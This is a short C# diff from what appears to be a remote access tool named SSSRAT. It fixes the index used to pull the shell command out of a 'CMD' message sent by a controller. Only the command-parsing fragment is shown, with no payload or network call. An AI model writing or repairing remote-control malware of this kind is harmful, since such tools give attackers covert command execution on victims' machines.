@@ -90,7 +90,7 @@ namespace SSSRAT {
 				if (command.StartsWith("CMD")) {
 					string cmdCommand;
 					try {
-						cmdCommand = splits[3];
+						cmdCommand = splits[2];
 					} catch {
 						continue;
 					}
